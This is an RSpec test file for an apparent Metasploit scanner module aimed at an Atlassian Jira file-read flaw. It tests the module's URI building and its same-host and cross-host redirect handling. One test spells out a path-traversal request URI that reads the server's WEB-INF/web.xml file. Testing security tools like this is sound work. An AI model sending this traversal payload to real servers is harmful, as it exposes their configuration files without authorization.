require 'spec_helper'

RSpec.describe 'Atlassian CVE-2026-21589 File Read Redirect Handling' do
  include_context 'Msf::Simple::Framework#modules loading'

  subject(:mod) do
    load_and_create_module(
      module_type: 'auxiliary',
      reference_name: 'scanner/http/atlassian_cve_2026_21589_file_read'
    )
  end

  let(:host) { '192.0.2.10' }

  let(:jira_body) do
    '<web-app><listener-class>com.atlassian.jira.web.ServletContextProviderListener</listener-class></web-app>'
  end

  let(:response) do
    instance_double(
      Rex::Proto::Http::Response,
      code: 200,
      body: jira_body
    )
  end

  before do
    mod.datastore['RHOST'] = host
    mod.datastore['RPORT'] = 80
    mod.datastore['TARGETURI'] = '/'
    mod.datastore['PRODUCT'] = 'Jira'
    mod.datastore['FILEPATH'] = ''
  end

  describe '#request_file' do
    it 'preserves an application context path in the traversal URI' do
      mod.datastore['TARGETURI'] = '/jira/'

      product = mod.class::PRODUCTS.fetch('JIRA')
      allow(mod).to receive(:send_request_cgi!).and_return(response)

      mod.send(:request_file, product, 'WEB-INF/web.xml')

      expect(mod).to have_received(:send_request_cgi!).with(
        hash_including(
          'method' => 'GET',
          'uri' => '/jira/download/resources/jira.webresources:color-picker-popup/images/..::..::..::..::..::WEB-INF::web.xml',
          'encode_params' => false
        )
      )
    end

    it 'follows a same-host redirect when retrieving a file' do
      product = mod.class::PRODUCTS.fetch('JIRA')
      redirect = instance_double(
        Rex::Proto::Http::Response,
        code: 302,
        redirect?: true,
        redirection: URI('http://192.0.2.10/redirected')
      )
      final_response = instance_double(
        Rex::Proto::Http::Response,
        code: 200,
        redirect?: false,
        redirection: nil,
        body: jira_body
      )
      allow(mod).to receive(:send_request_cgi).and_return(redirect, final_response)

      result = mod.send(:request_file, product, 'WEB-INF/web.xml')

      expect(result).to eq(final_response)
      expect(mod).to have_received(:send_request_cgi).twice
    end

    it 'does not follow a cross-host redirect when retrieving a file' do
      product = mod.class::PRODUCTS.fetch('JIRA')
      redirect = instance_double(
        Rex::Proto::Http::Response,
        code: 302,
        redirect?: true,
        redirection: URI('http://192.0.2.11/redirected')
      )
      allow(mod).to receive(:send_request_cgi).and_return(redirect)

      result = mod.send(:request_file, product, 'WEB-INF/web.xml')

      expect(result).to eq(redirect)
      expect(mod).to have_received(:send_request_cgi).once
    end
  end
end
